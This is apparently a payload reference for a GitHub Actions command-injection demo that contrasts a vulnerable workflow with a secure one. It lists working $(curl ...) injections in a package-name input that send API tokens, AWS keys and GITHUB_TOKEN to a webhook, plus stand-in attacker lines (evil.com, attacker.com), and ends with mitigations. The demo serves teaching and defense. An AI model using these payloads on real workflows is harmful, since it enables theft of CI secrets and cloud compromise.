# Attack Payload Examples

Quick reference for testing the vulnerability with corrected attack vectors based on actual testing.

## Setup

1. Get a webhook URL: https://webhook.site
2. Copy your unique webhook ID (e.g., `abc-123-def`)
3. Use payloads below, replacing `YOUR-WEBHOOK-ID`

---

## Working Attack Payloads

### 1. Secret Exfiltration via Command Substitution (WORKS - Most Dangerous)

**Target:** `vulnerable.yml` - Pattern 3 (Secrets in env with direct interpolation)

**Package name:**
```
$(curl "https://webhook.site/YOUR-WEBHOOK-ID?token=$API_TOKEN&aws=$AWS_KEY")
```

**Package version:**
```
1.0.0
```

**Expected result:**
- ✅ Curl executes during command substitution
- ✅ Webhook receives GET request with **both secrets** in query parameters
- ✅ Demonstrates that secrets in `env:` can be exfiltrated via command injection

**Key Details:**
- URL **must be quoted** to prevent bash from interpreting `&` as background operator
- Without quotes, only `token` parameter is sent, `aws=$AWS_KEY` runs as background job
- Command substitution has full access to all environment variables in the step

**Why it's critical:** Even though the workflow uses `env:` to set secrets (which is safer than direct `${{ }}` in run), if the **input** still uses direct interpolation `${{ inputs.package_name }}`, an attacker can inject command substitution that accesses the environment variables.

**Workflow code that's vulnerable:**
```yaml
env:
  API_TOKEN: ${{ secrets.DEMO_SECRET }}
  AWS_KEY: ${{ secrets.DEMO_AWS_KEY }}
run: |
  echo "Sending notification for package: ${{ inputs.package_name }}"
```

**What happens:**
1. GitHub expands `${{ inputs.package_name }}` → `$(curl "https://webhook.site/...?token=$API_TOKEN&aws=$AWS_KEY")`
2. Shell executes command substitution, which has access to `$API_TOKEN` and `$AWS_KEY` from env
3. Both secrets are exfiltrated to the webhook

---

### 2. Basic Command Injection (WORKS - Demonstrates Vulnerability)

**Target:** `vulnerable.yml` - Pattern 2 (No secrets in environment)

**Package name:**
```
$(curl "https://webhook.site/YOUR-WEBHOOK-ID?repo=$GITHUB_REPOSITORY&actor=$GITHUB_ACTOR")
```

**Expected result:**
- ✅ Curl executes (see progress output in logs)
- ✅ Webhook receives GET request with repository info
- ✅ Proves command injection works
- ❌ No secrets exfiltrated (Pattern 2 has no secrets in env)

**Purpose:** Demonstrates that direct `${{ }}` interpolation allows arbitrary command execution, even when the step doesn't have secrets. This is useful for:
- Proving the vulnerability exists
- Exfiltrating GitHub-provided environment variables
- Running reconnaissance commands
- Setting up for attacks on later steps

**Why it works:** GitHub Actions provides default environment variables like `$GITHUB_REPOSITORY`, `$GITHUB_ACTOR`, etc. These are always available in the shell. The `$(...)` command substitution executes before the main command.

---

### 3. Variable Expansion Secret Leak (WORKS on vulnerable workflow)

**Target:** `vulnerable.yml`

**Package name:**
```
leaked-${DEMO_SECRET}
```

**Expected result:**
- ⚠️ Git fails with error showing the secret in the branch name
- ⚠️ Secret visible in workflow logs

**Example log:**
```
fatal: 'update-leaked-super-secret-api-key-12345-1.0.0' is not a valid branch name
```

**Why it works:** Variable expansion happens in the shell, and error messages include the expanded value.

---

### 4. GitHub Token Exfiltration (WORKS on direct interpolation)

**Target:** `vulnerable.yml`

**Package name:**
```
$(curl https://webhook.site/YOUR-WEBHOOK-ID/token-$(echo $GITHUB_TOKEN | base64 | cut -c1-30))
```

**Expected result:**
- ✅ Webhook receives request with base64-encoded token preview in URL path

---

### 5. Multi-Command with File Storage (WORKS on direct interpolation)

**Target:** `vulnerable.yml`

**Package name:**
```
$(echo $DEMO_SECRET > /tmp/secret.txt && curl -X POST https://webhook.site/YOUR-WEBHOOK-ID --data-binary @/tmp/secret.txt)
```

**Expected result:**
- ✅ Secret saved to file then uploaded via POST

---

## Attacks That DON'T Work

### ❌ Semicolon Command Chaining (Blocked by quotes + git validation)

**Package name:**
```
foo"; curl https://webhook.site/YOUR-WEBHOOK-ID #
```

**Why it doesn't work:**
- Double quotes in `git checkout -b "..."` keep the entire string as one argument
- Git validates branch names and rejects those with quotes/semicolons
- The semicolon never acts as a command separator

**Result:** Git fails with "not a valid branch name" error, but curl never executes.

---

## Testing Against Each Workflow

### Comparison Matrix

| Attack Payload | vulnerable.yml | secure.yml |
|----------------|----------------|------------|
| `$(curl ...)` | ❌ Executes | ✅ Blocked |
| `foo"; curl ...` | ✅ Blocked by git | ✅ Blocked by validation |
| `leaked-${SECRET}` | ⚠️ Leaks in logs | ✅ Blocked by validation |
| `` `curl ...` `` | ❌ Executes | ✅ Blocked by validation |

---

## Valid Inputs (Should Pass Secure Workflow)

These inputs pass validation in `secure.yml`:

### Valid Package Names

```
@prefect/ui-library
lodash
@babel/core
react-router-dom
my-awesome-package
```

### Valid Versions

```
1.0.0
2.1.3
10.20.30
1.0.0-alpha
2.0.0-beta.1
3.1.4+build.123
```

---

## Understanding Why Environment Variables Help

### Direct Interpolation Flow

```yaml
run: git checkout -b "update-${{ inputs.package_name }}"
```

**Input:** `$(curl evil.com)`

**Step 1:** GitHub Actions evaluates `${{ inputs.package_name }}` → `$(curl evil.com)`

**Step 2:** Shell command becomes: `git checkout -b "update-$(curl evil.com)"`

**Step 3:** Shell sees `$(...)` and executes it → **Attack succeeds**

---

### Environment Variable Flow

```yaml
run: git checkout -b "update-${PACKAGE_NAME}"
env:
  PACKAGE_NAME: ${{ inputs.package_name }}
```

**Input:** `$(curl evil.com)`

**Step 1:** GitHub Actions evaluates `${{ inputs.package_name }}` → `$(curl evil.com)`

**Step 2:** Environment variable is set: `PACKAGE_NAME='$(curl evil.com)'` (as literal string)

**Step 3:** Shell command becomes: `git checkout -b "update-${PACKAGE_NAME}"`

**Step 4:** Shell expands `${PACKAGE_NAME}` → Gets the literal string `$(curl evil.com)`

**Step 5:** Git receives literal text, not evaluated command → **Attack blocked**

**Source:** [GitHub Docs - Security Hardening](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)

---

## Defense Verification

### Test 1: Vulnerable (Direct Interpolation)

**Workflow:** `vulnerable.yml`
**Input:** `$(curl https://webhook.site/YOUR-ID?test=1)`
**Result:** ❌ Curl executes, secret stolen

### Test 2: Secure (Environment Variables + Validation)

**Workflow:** `secure.yml`
**Input:** `$(curl https://webhook.site/YOUR-ID?test=2)`
**Result:** ✅ Validation rejects input, no execution

---

## Real-World Scenario

### Production Impact

In a real repository with production secrets:

```yaml
env:
  AWS_ACCESS_KEY_ID: ${{ secrets.AWS_ACCESS_KEY_ID }}
  AWS_SECRET_ACCESS_KEY: ${{ secrets.AWS_SECRET_ACCESS_KEY }}
  DATABASE_URL: ${{ secrets.DATABASE_URL }}
```

**Attack payload (if using direct interpolation):**
```
$(curl https://attacker.com?aws=$AWS_ACCESS_KEY_ID-$AWS_SECRET_ACCESS_KEY&db=$DATABASE_URL)
```

**Impact:**
- Complete AWS account compromise
- Database credentials stolen
- Customer data at risk
- Infrastructure takeover possible

---

## Mitigation Checklist

- [ ] Use environment variables (not direct `${{ }}` in `run:`)
- [ ] Add input validation with regex whitelists
- [ ] Test validation with attack payloads
- [ ] Restrict who can trigger workflows
- [ ] Use `actions/github-script` for complex logic
- [ ] Review all workflow files for `${{ inputs.* }}` usage
- [ ] Audit secrets and minimize their scope
- [ ] Enable branch protection rules

---

## Key Takeaways

1. **Direct `${{ }}` interpolation enables command injection** via command substitution
2. **Environment variables provide documented protection** per GitHub's official guidance
3. **But environment variables alone aren't enough** - validation is still required
4. **The semicolon attack doesn't work** due to quoting + git validation (but don't rely on this)
5. **Defense-in-depth: use both** environment variables AND input validation

---

## References

- [GitHub Docs: Security Hardening for GitHub Actions](https://docs.github.com/en/actions/security-for-github-actions/security-guides/security-hardening-for-github-actions)
- [GitHub Docs: Secure Use Reference](https://docs.github.com/en/actions/reference/security/secure-use)

---

**Remember:** Always validate untrusted input, even when using environment variables!
